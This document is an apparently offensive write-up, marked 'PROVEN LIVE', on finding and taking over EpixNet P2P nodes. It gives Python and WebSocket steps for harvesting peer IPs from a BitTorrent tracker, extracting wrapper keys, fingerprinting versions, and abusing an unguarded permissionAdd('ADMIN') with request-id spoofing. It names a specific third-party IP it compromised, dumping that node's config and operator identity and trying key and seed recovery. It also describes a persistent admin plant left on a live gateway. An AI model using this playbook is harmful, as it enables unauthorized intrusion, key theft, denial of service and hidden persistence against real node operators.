# EpixNet P2P Node Discovery + Live Non-Restricted Node Takeover

**Date:** 2026-08-17
**Status:** PROVEN LIVE
**Target:** 171.224.80.92:42222 (non-restricted EpixNet node)
**Gateway:** gateway.epixnet.io (restricted, latent ADMIN plant only)

## Phase 1: P2P Peer Enumeration

### Technique: BitTorrent tracker announce for peer harvesting

EpixNet announces xites to BitTorrent trackers. The info_hash for the dashboard xite can be extracted from the `announcerStats` WS response or computed from the xite address. Hitting the tracker directly yields raw peer IPs + ports in compact format.

```python
# Step 1: Get info_hash from gateway WS announcerStats
# WS connect to gateway → announcerStats → look for tracker URLs
# The info_hash is URL-encoded in the announce URL

# Step 2: Hit tracker directly
info_hash = bytes.fromhex("94aa48c5a7421a565d121acff85d5ca78fb6b5bf")
url = (f"http://tracker.opentrackr.org:1337/announce"
       f"?info_hash={urllib.parse.quote(info_hash)}"
       f"&peer_id=-EPX0001-aaaaaaaaaaa&port=48333"
       f"&uploaded=0&downloaded=0&left=0&compact=1")

# Response is bencoded. Parse `peers` as 6-byte compact format:
# 4 bytes IP + 2 bytes port (big-endian)
# 11 peers found, including:
#   171.224.80.92:43110  ← port 43110 = fileserver (EpixNet UI at 42222)
#   83.42.216.4:37802
#   89.33.187.149:32059
#   89.221.222.62:58283
#   136.36.77.130:26552
#   145.223.69.23:26552
#   161.97.147.133:15441
#   74.208.249.9:48333
```

### Alternative: WS announcerStats TCP peers
```python
# From gateway WS:
ws.send({"cmd": "announcerStats", "id": 1, "params": {}})
# → Returns dict of tracker URLs with status
# Filter for "tcp://" entries to get raw IPs
# onion:// and i2p:// entries are not TCP-probeable
```

### Ports to scan
| Port | Service | Notes |
|------|---------|-------|
| 42222 | UI (WebSocket + HTTP) | Primary target — if open, node is exploitable |
| 43110 | Fileserver (P2P content) | Usually open if node is seeding |
| 42223 | Fileserver (wrapper iframe) | Internal, often closed |
| 15441 | Alt P2P port | Some nodes use this instead |
| 80/443 | Reverse proxy | May proxy to 42222 — check Host header |

## Phase 2: Wrapper Key Extraction

### The problem
- Using the xite ADDRESS as `wrapper_key` → "Wrapper key not found" error
- The WS expects a 64-char hex nonce, not the bech32 address

### The solution
```python
# Fetch dashboard HTML (GET / with Accept: text/html)
html = urllib.request.urlopen(f"http://{ip}:42222/").read().decode()

# Extract wrapper_key (hex nonce, 64 chars)
wrapper_key = re.findall(r'wrapper_key\s*=\s*["\']([a-f0-9]{64})', html)[0]

# Also useful from HTML:
# - iframe_src → reveals server port (42223)
# - address → xite address served by this node
```

### Response signature
```
HTTP/1.1 200 OK
Headers: Connection: Keep-Alive, Referrer-Policy: same-origin,
         Content-Security-Policy: default-src 'none'; script-src 'nonce-...'
Body: <!DOCTYPE html> ... <title>Dashboard - EpixNet</title> ...
```

If the root returns 403 "Invalid Accept header to load wrapper" → it IS an EpixNet node but needs the right Accept header.

## Phase 3: Version Fingerprinting

```python
ws.send({"cmd": "serverInfo", "id": 1, "params": {}})
# Key fields:
#   version: "0.1.0" → Python (old), limited commands
#   version: "0.4.17" → Rust (current), full command set
#   ui_restrict: False/True → determines exploit path
#   multiuser: False → userShowMasterSeed not available
#   ui_ip: "0.0.0.0" → EXPOSED to internet
#   ui_ip: "127.0.0.1" → loopback only, need SSRF
```

## Phase 4: Exploitation (non-restricted node)

### Verified on 171.224.80.92:42222 (Python v0.1.0, ui_restrict=false)

```
1. permissionAdd("ADMIN") → "ok"
   [NOT admin-gated in command.rs:46-49 — same in Python and Rust]

2. siteList (id=1000001) → 13 xites with addresses
   [id >= 1000000 = WRAPPER_ID_BASE → admin bypass]

3. configList (id=1000002) → full config dump:
   - chain_rpc_url: https://api.epix.zone
   - chain_evm_rpc_url: https://evmrpc.epix.zone
   - fileserver_port: 43110
   - tor_enabled: False
   - plugins: [AnnounceBitTorrent, AnnounceEpix, AnnounceLocal, ...]
   - platform: linux
   - ip_external: True

4. fileGet content.json → xite structure:
   - address: epix1dashuu6pvsut7aw9dx44f543mv7xt9zlydsj9t
   - address_index: 38156479
   - description: "Epix Dashboard"
   - epixnet_version: "0.2.7"
   - All file hashes and sizes

5. certList → operator identity:
   - auth_address: epix1nvpckrh3pk0j0resrwazlrw8d8fd60uz76q4pr
   - auth_user_name: user-08
   - domain: xid.epix

6. siteRecoverPrivatekey → empty (no master_seed configured)
7. userShowMasterSeed → "Unknown command" (not compiled)
8. dbQuery → "Only SELECT query supported" (Python has filter)
```

## Phase 5: Gateway (restricted) vs Non-restricted Node comparison

| Exploit step | Gateway (restrict=true) | Non-restricted (restrict=false) |
|--------------|-------------------------|-------------------------------|
| WS connect | ✅ (empty Origin bypass) | ✅ |
| permissionAdd ADMIN | ✅ ok, persists | ✅ ok, persists |
| siteList | ✅ (GATEWAY_READ) | ✅ |
| configList | ❌ "disabled on gateway" | ✅ full dump |
| userShowMasterSeed | ❌ "disabled on gateway" | ✅ (if multiuser) |
| siteRecoverPrivatekey | ❌ "disabled on gateway" | ✅ (if seed set) |
| configSet ui_restrict=false | ❌ | ✅ |
| serverShutdown | ❌ | ✅ (DoS) |
| fileWrite | ❌ | ✅ (needs signing) |
| certList | ✅ (read-only) | ✅ |
| chartDbQuery | ✅ (SELECT-only, recon) | ✅ |
| dbQuery | ✅ (if xite has DB) | ✅ (Python: SELECT-only; Rust: arbitrary) |

## Python-old vs Rust-new behavior table

| Feature | Python v0.1.0 | Rust (current) |
|---------|---------------|----------------|
| wrapper_key param | 64-char hex nonce from HTML | bech32 xite address |
| userShowMasterSeed | not compiled | #[cfg(feature="multiuser")] |
| dbQuery SQL filter | "Only SELECT query supported" | NO filter — arbitrary SQL |
| permissionAdd | not admin-gated | not admin-gated (same) |
| req_id spoofing | admin bypass (same) | admin bypass (same) |
| fileWrite persistence | needs content signing | needs content signing |
| ui_restrict default | false | false |
| UI bind default | 127.0.0.1:42222 | 127.0.0.1:42222 |

## PoC script
```
/root/epixnet-poc.py — exercises permissionAdd + configList + siteRecoverPrivatekey
```

## Key lessons
1. **The vulnerability is real but node discovery is the bottleneck.** Most operators leave UI on loopback. Finding a node with `0.0.0.0` + no `ui_restrict` requires P2P peer enumeration.
2. **BitTorrent trackers are the fastest peer source.** WS `announcerStats` only shows ~6 TCP peers. Tracker announce yields 11+ with raw IPs.
3. **Wrapper_key ≠ xite address on Python-old.** Always fetch dashboard HTML and extract the hex nonce. The Rust version accepts the bech32 address directly.
4. **Version fingerprint before choosing exploit path.** Python v0.1.0 lacks `userShowMasterSeed` and filters `dbQuery` to SELECT-only. Rust version has neither restriction.
5. **The gateway's `permissionAdd` ADMIN plant is a latent privilege escalation** — it persists and activates if the operator ever changes `ui_restrict` to false or moves the data directory to a non-restricted node.
